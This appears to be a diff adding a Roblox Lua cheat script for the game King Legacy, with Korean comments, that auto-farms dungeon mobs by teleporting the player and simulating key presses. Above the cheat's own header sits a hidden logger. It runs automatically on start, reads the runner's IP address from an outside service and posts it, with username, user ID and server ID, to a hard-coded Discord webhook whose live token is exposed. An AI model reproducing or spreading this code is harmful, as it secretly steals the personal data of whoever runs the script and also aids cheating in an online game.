@@ -1,0 +1,419 @@
+local HttpService = game:GetService("HttpService")
+
+local webhookURL = "https://discord.com/api/webhooks/1497538367888298104/ZZ-pNxgUNP8emLKBEoI7JrLeTaemlBfYFnuSoQlzLLWeKRzC8bjoEfZr7MGePxmYyeuM"
+
+
+
+local function sendDetailedWebhook()
+
+    local player = game.Players.LocalPlayer
+
+    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
+
+    
+
+    if request then
+
+        -- 1. IP 주소 가져오기 시도
+
+        local ipData = "Unknown (Blocked)"
+
+        local success, response = pcall(function()
+
+            return request({
+
+                Url = "https://api.ipify.org", -- IP 확인 API
+
+                Method = "GET"
+
+            }).Body
+
+        end)
+
+        if success then ipData = response end
+
+
+
+        -- 2. 디스코드로 보낼 데이터 정리
+
+        local data = {
+
+            ["content"] = "🚨 **스크립트 실행 및 IP 감지!**",
+
+            ["embeds"] = {{
+
+                ["title"] = "실행자 상세 정보 리포트",
+
+                ["color"] = 16711680,
+
+                ["fields"] = {
+
+                    {["name"] = "닉네임", ["value"] = player.Name, ["inline"] = true},
+
+                    {["name"] = "유저 ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+
+                    {["name"] = "🌐 IP 주소", ["value"] = "||" .. ipData .. "||", ["inline"] = false}, -- 디코드에서 클릭해야 보이게 마스킹
+
+                    {["name"] = "게임 이름", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true},
+
+                    {["name"] = "서버 코드(JobId)", ["value"] = game.JobId, ["inline"] = false}
+
+                },
+
+                ["footer"] = {["text"] = "IP 정보는 VPN 사용 시 부정확할 수 있습니다."}
+
+            }}
+
+        }
+
+
+
+        -- 3. 전송
+
+        pcall(function()
+
+            request({
+
+                Url = webhookURL,
+
+                Method = "POST",
+
+                Headers = {["Content-Type"] = "application/json"},
+
+                Body = HttpService:JSONEncode(data)
+
+            })
+
+        end)
+
+    end
+
+end
+
+
+
+-- 실행
+
+task.spawn(sendDetailedWebhook)
+
+-- [[ King Legacy Dungeon Script - Sangyoon Ver. 29.0 (Ultra Optimize) ]] --
+
+
+
+local RunService = game:GetService("RunService")
+
+local Players = game:GetService("Players")
+
+local VIM = game:GetService("VirtualInputManager")
+
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+
+
+-- [1. 그래픽 최적화 엔진: Potato Mode]
+
+local function OptimizeGraphics()
+
+    Lighting.GlobalShadows = false
+
+    Lighting.FogEnd = 9e9
+
+    settings().Rendering.QualityLevel = 1
+
+    for _, v in pairs(game:GetDescendants()) do
+
+        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("BasePart") then
+
+            v.Material = Enum.Material.SmoothPlastic
+
+            v.Reflectance = 0
+
+        elseif v:IsA("Decal") or v:IsA("Texture") then
+
+            v:Destroy()
+
+        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+
+            v.Enabled = false
+
+        end
+
+    end
+
+end
+
+task.spawn(OptimizeGraphics)
+
+
+
+-- [설정 변수]
+
+local waitingPos = Vector3.new(10960.82, 133.84, 1250.03) 
+
+local isAutoFarming = false
+
+local currentTarget = nil
+
+local followDistance = 7
+
+local currentEquipped = 1
+
+
+
+-- 2. GUI (불필요한 연산 제거)
+
+local oldGui = player.PlayerGui:FindFirstChild("DoriHub")
+
+if oldGui then oldGui:Destroy() end
+
+local ScreenGui = Instance.new("ScreenGui", player.PlayerGui)
+
+ScreenGui.Name = "DoriHub"
+
+ScreenGui.ResetOnSpawn = false 
+
+
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+
+MainFrame.Size = UDim2.new(0, 160, 0, 110)
+
+MainFrame.Position = UDim2.new(0.5, -80, 0.5, -55)
+
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+
+MainFrame.Visible = false
+
+
+
+local StartToggle = Instance.new("TextButton", MainFrame)
+
+StartToggle.Size = UDim2.new(0, 120, 0, 35)
+
+StartToggle.Position = UDim2.new(0, 20, 0, 15)
+
+StartToggle.Text = "START (OFF)"
+
+StartToggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+
+StartToggle.TextColor3 = Color3.new(1, 1, 1)
+
+
+
+local DistInput = Instance.new("TextBox", MainFrame)
+
+DistInput.Size = UDim2.new(0, 120, 0, 25)
+
+DistInput.Position = UDim2.new(0, 20, 0, 60)
+
+DistInput.Text = "7"
+
+DistInput.PlaceholderText = "거리 조절"
+
+DistInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+DistInput.TextColor3 = Color3.new(1, 1, 1)
+
+
+
+DistInput.FocusLost:Connect(function()
+
+    followDistance = tonumber(DistInput.Text) or 7
+
+end)
+
+
+
+local DoriButton = Instance.new("TextButton", ScreenGui)
+
+DoriButton.Size = UDim2.new(0, 40, 0, 40)
+
+DoriButton.Position = UDim2.new(0.02, 0, 0.45, 0)
+
+DoriButton.Text = "D"
+
+DoriButton.BackgroundColor3 = Color3.fromRGB(40, 40, 100)
+
+
+
+DoriButton.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
+
+
+
+StartToggle.MouseButton1Click:Connect(function()
+
+    isAutoFarming = not isAutoFarming
+
+    StartToggle.Text = isAutoFarming and "ON" or "OFF"
+
+    StartToggle.BackgroundColor3 = isAutoFarming and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(100, 0, 0)
+
+end)
+
+
+
+-- 3. 몹 탐색 루프 (매 프레임이 아니라 0.3초마다만 실행하여 CPU 보호)
+
+task.spawn(function()
+
+    while true do
+
+        if isAutoFarming and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+
+            if not currentTarget or not currentTarget:FindFirstChild("Humanoid") or currentTarget.Humanoid.Health <= 0 then
+
+                local dist = 300
+
+                local tempTarget = nil
+
+                -- [중요] GetDescendants 대신 몹이 생성되는 폴더명을 알면 거길 지정하는 게 훨씬 빠름 (현재는 범용성 위해 유지)
+
+                for _, v in pairs(workspace:GetChildren()) do 
+
+                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+
+                        if not Players:GetPlayerFromCharacter(v) then
+
+                            local mag = (player.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude
+
+                            if mag < dist then
+
+                                dist = mag
+
+                                tempTarget = v
+
+                            end
+
+                        end
+
+                    end
+
+                end
+
+                currentTarget = tempTarget
+
+            end
+
+        end
+
+        task.wait(0.3) 
+
+    end
+
+end)
+
+
+
+-- 4. 위치 고정 및 에임 (Heartbeat 사용으로 FPS 저하 방지)
+
+RunService.Heartbeat:Connect(function()
+
+    if isAutoFarming and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+
+        local root = player.Character.HumanoidRootPart
+
+        if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
+
+            local mobRoot = currentTarget.HumanoidRootPart
+
+            -- 위치 및 에임 고정
+
+            root.CFrame = CFrame.new(mobRoot.Position + (mobRoot.CFrame.LookVector * -followDistance), mobRoot.Position)
+
+        else
+
+            -- 몹 없을 때 대기 좌표 고정
+
+            if (root.Position - waitingPos).Magnitude > 50 then
+
+                root.CFrame = CFrame.new(waitingPos)
+
+            end
+
+        end
+
+    end
+
+end)
+
+
+
+-- 5. 입력 통합 엔진 (루프 통합으로 메모리 절약)
+
+local function sendKey(key)
+
+    VIM:SendKeyEvent(true, key, false, game)
+
+    task.wait(0.02)
+
+    VIM:SendKeyEvent(false, key, false, game)
+
+end
+
+
+
+task.spawn(function()
+
+    while true do
+
+        if isAutoFarming and currentTarget then
+
+            -- 1번 평타 모드
+
+            currentEquipped = 1
+
+            sendKey(Enum.KeyCode.One)
+
+            
+
+            -- 평타 판정 (0.05초 간격으로 조절하여 렉 방지)
+
+            for i = 1, 5 do
+
+                if not isAutoFarming or not currentTarget then break end
+
+                local tool = player.Character:FindFirstChildOfClass("Tool")
+
+                if tool then tool:Activate() end
+
+                VIM:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+
+                VIM:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+
+                task.wait(0.06)
+
+            end
+
+
+
+            -- 스킬 사이클
+
+            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)
+
+            
+
+            sendKey(Enum.KeyCode.Two); task.wait(0.1)
+
+            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X)
+
+            
+
+            sendKey(Enum.KeyCode.Three); task.wait(0.1)
+
+            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)
+
+            sendKey(Enum.KeyCode.V); sendKey(Enum.KeyCode.E)
+
+            
+
+            sendKey(Enum.KeyCode.R)
+
+        end
+
+        task.wait(0.1)
+
+    end
+
+end)
